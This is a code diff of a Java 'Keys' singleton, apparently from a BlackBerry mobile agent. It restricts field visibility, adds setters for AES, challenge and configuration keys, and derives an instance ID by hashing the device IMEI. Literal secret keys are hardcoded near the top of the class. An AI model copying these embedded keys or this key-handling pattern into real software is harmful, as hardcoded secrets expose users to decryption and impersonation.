@@ -17,26 +17,26 @@ public class Keys implements Singleton  {
     private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
     // log
     private static String instanceID = "bg5etG87q20Kg52W5Fg1";
-    public static String buildID = "av3pVck1gb4eR2d8";
+    private static String buildID = "av3pVck1gb4eR2d8";
 
     private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
     private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar
 
-    public static byte[] byteAesKey;
-    public static byte[] byteChallengeKey;
-    public static byte[] byteConfKey;
-    public static byte[] byteConfNameKey;
+    private static byte[] byteAesKey;
+    private static byte[] byteChallengeKey;
+    private static byte[] byteConfKey;
+    private static byte[] byteConfNameKey;
+    private static byte[] byteInstanceID;
 
     static Keys instance=null;
     private Keys() {         
         byte[] imei = GPRSInfo.getIMEI();
-        instanceID =  Utils.byteArrayToHex(Encryption.SHA1(imei));        
+        byteInstanceID =  Encryption.SHA1(imei);    
+        instanceID =  Utils.byteArrayToHex(byteInstanceID);        
     };
     
-    public synchronized static Keys getInstance()
-    {
-        if(instance == null)
-        {
+    public synchronized static Keys getInstance(){
+        if(instance == null) {
             instance = new Keys();            
         }
         
@@ -49,9 +49,15 @@ public class Keys implements Singleton  {
         }
         return byteAesKey;
     }
+    public void setAesKey(byte[] key) {
+        byteAesKey = key;
+    }
 
     public byte[] getBuildId() {
         return buildID.getBytes();
+    }
+    public void setBuildID(String build) {
+        buildID = build;
     }
 
     public byte[] getChallengeKey() {
@@ -61,6 +67,10 @@ public class Keys implements Singleton  {
 
         return byteChallengeKey;
     }
+    
+    public void setChallengeKey(byte[] challenge_) {
+        byteChallengeKey = challenge_;
+    }
 
     public byte[] getConfKey() {
         if (byteConfKey == null) {
@@ -68,6 +78,9 @@ public class Keys implements Singleton  {
         }
 
         return byteConfKey;
+    }
+    public void setConfKey(byte[] conf_) {
+        byteConfKey = conf_;
     }
     
     public byte[] getConfNameKey() {
@@ -80,7 +93,7 @@ public class Keys implements Singleton  {
 
     public byte[] getInstanceId() {
 
-        return instanceID.getBytes();
+        return byteInstanceID;
     }
 
     private byte[] keyFromString(String string) {
